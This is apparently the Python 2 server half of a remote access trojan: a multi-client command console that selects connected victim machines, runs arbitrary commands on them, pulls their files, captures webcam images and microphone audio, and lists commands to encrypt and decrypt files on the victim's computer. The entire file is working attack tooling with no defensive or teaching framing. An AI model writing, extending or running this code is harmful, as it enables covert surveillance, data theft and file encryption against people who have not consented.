# Future imports to work like Python 3
from __future__ import print_function
import cv2
import time
import wave
import numpy
import socket
import pyaudio
import threading
from Queue import Queue

# Constant variables
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []
COMMANDS = {'help': ['Shows this help'],
            'list': ['Lists connected clients'],
            'transfer': [
                'After making a connection, you can use this command '
                'to transfer files'],
            'encrypt': [
                'After making a connection, you can use this command '
                'to encrypt files on the clients computer'],
            'decrypt': [
                'After making a connection, you can use this command '
                'to decrypt files on the clients computer'],
            'select': [
                'Selects a client by its index on the list.'
                ' Takes index as a parameter'],
            'quit': [
                'Stops current connection with a client. To be used when'
                ' client is selected']
            }


class clients:
    number_of_computers = 0

    def __init__(self, client_ip, client_port, client_name):
        self.computer_id = clients.number_of_computers
        clients.number_of_computers += 1
        self.client_ip = client_ip
        self.client_port = client_port
        self.client_name = client_name

    def get_client_name(self):
        return socket.getfqdn(self.client_ip)


class color:
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'


def print_help():
    """
    The function prints all the commands we can use and what they do

    :return: None
    """
    for cmd, explanation in sorted(COMMANDS.iteritems()):
        print(
            "{0}:\t{1}".format((color.BOLD + color.UNDERLINE + cmd + color.END),
                               (color.RED + explanation[0] + color.END)))


def socket_create():
    """
    The function creates socket (allows two computers to connect)

    :return: None
    """
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print('Socket creation error: ' + str(msg))


def socket_bind():
    """
    The function binds socket to port and wait for connection from client

    :return: None
    """
    try:
        global host
        global port
        global s
        # print('Binding socket to port: ' + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print('Socket binding error: ' + str(msg) + "\n" + "Retrying...")
        time.sleep(5)
        socket_bind()


def accept_connections():
    """
    The function accepts connections from multiple clients and save to list

    :return: None
    """
    for connection in all_connections:
        connection.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1)
            all_connections.append(conn)
            all_addresses.append(address)
            print("\n Connection has been established: " + address[0])
        except:
            print("Error accepting connections")


def start_turtle():
    """
    The function shows an interactive prompt for sending commands remotely

    :return: None
    """
    while True:
        cmd = raw_input('turtle> ')
        if cmd == 'list':
            list_connections()
        elif 'select' in cmd:
            conn = get_target(cmd)
            if conn is not None:
                send_target_commands(conn)
        elif cmd == 'help':
            print_help()
        else:
            print("Command not recognized")


def list_connections():
    """
    The function displays all the current connections

    :return: None
    """
    results = ''
    for counter, conn in enumerate(all_connections):
        try:
            conn.send(str.encode('list'))
            conn.recv(20480)
        except:
            del all_connections[counter]
            del all_addresses[counter]
            continue
        results += str(counter) + '   ' + str(
            all_addresses[counter][0]) + '   ' + str(
            all_addresses[counter][1]) + '\n'
    print('------- Clients -------' + '\n' + results)


def get_target(cmd):
    """
    The function helps the server select a client

    :param cmd: The command we are trying to execute
    :type cmd: str

    :return: A IP address of a client to connect to
    :rtype: str
    """
    try:
        target = cmd.replace('select ', '')
        target = int(target)
        conn = all_connections[target]
        print("You are now connected to " + str(all_addresses[target][0]))
        print(str(all_addresses[target][0]) + '> ', end="")
        return conn
    except:
        print("Not a valid selection")
        return None


def get_file(command, conn):
    """
    The function receives a file from the target computer

    :param command: The command with the file name
    :type command: str

    :param conn: The connection to the target computer

    :return: None
    """
    f = open(str(command[9:]), 'wb')
    not_exist = False
    while True:
        print("Receiving...")
        file_conn = conn.recv(20480)
        while file_conn:
            if str(file_conn).__contains__('The file was sent'):
                f.write(file_conn[:str(file_conn).find('The file was sent')])
                break
            elif str(file_conn).__contains__('The file does'):
                print('The file does not exist rewrite the command')
                not_exist = True
                break
            print("Receiving...")
            f.write(file_conn)
            file_conn = conn.recv(20480)
        if not not_exist:
            f.close()
            print("Done Receiving")
            print(str(file_conn[str(file_conn).find('The file was '
                                                    'sent'):]), end="")
            break


def get_camera(conn):
    """
    The function gets an image from the client through the socket
    and shows it on the screen

    :param conn: a connection

    :return: None
    """
    frame_data = conn.recv(4000000)
    frame = numpy.fromstring(frame_data, dtype=numpy.uint8)
    frame = frame.reshape(480, 640, 3)
    cv2.imshow("Capturing", frame)
    key = cv2.waitKey(0)
    if key:
        cv2.destroyAllWindows()


def get_audio(conn):
    """
    The function gets a recorded audio from the mic inside the clients computer

    :param conn: a connection

    :return: None
    """
    c_chunk = 1024
    audio_format = pyaudio.paInt16
    c_channels = 1
    c_rate = 44100
    record_seconds = 20
    wave_output_filename = "server_output.wav"
    width = 2
    frames = []

    p = pyaudio.PyAudio()
    stream = p.open(format=p.get_format_from_width(width),
                    channels=c_channels,
                    rate=c_rate,
                    output=True,
                    frames_per_buffer=c_chunk)

    data = conn.recv(1024)
    i = 1
    while data:
        if str(data).__contains__('The file was sent'):
            stream.write(data[:str(data).find('The file was sent')])
            frames.append(data[:str(data).find('The file was sent')])
            break
        stream.write(data)
        # print(str(data))
        data = conn.recv(1024)
        i = i + 1
        print(i)
        frames.append(data)

    wf = wave.open(wave_output_filename, 'wb')
    wf.setnchannels(c_channels)
    wf.setsampwidth(p.get_sample_size(audio_format))
    wf.setframerate(c_rate)
    wf.writeframes(b''.join(frames))
    wf.close()

    stream.stop_stream()
    stream.close()
    p.terminate()
    print("Done Receiving")
    print(str(data[str(data).find('The file was '
                                  'sent'):]), end="")


def send_target_commands(conn):
    """
    The function connects to a target client and executes commands

    :param conn: a connection

    :return: None
    """
    while True:
        try:
            cmd = raw_input()
            if len(str.encode(cmd)) > 0:
                if cmd[:8] == 'transfer':
                    conn.send(str.encode(cmd))
                    get_file(cmd, conn)
                    continue
                elif cmd.__contains__('show camera'):
                    conn.send(str.encode(cmd))
                    get_camera(conn)
                    continue
                elif cmd.__contains__('record audio'):
                    conn.send(str.encode(cmd))
                    get_audio(conn)
                    continue
                else:
                    conn.send(str.encode(cmd))
                    client_response = str(conn.recv(20480))
                    print(client_response, end="")
            if cmd == 'quit':
                break
        except:
            print("Connection was lost")
            break


def create_workers():
    """
    The function creates the threads (Workers)

    :return: None
    """
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    """
    The function does the next job in the queue (one handles connections,
    the other sends commands)

    :return: None
    """
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_turtle()
        queue.task_done()


def create_jobs():
    """
    The function defines each item on the list as a new job

    :return: None
    """
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


def main():
    create_workers()
    create_jobs()


if __name__ == '__main__':
    main()
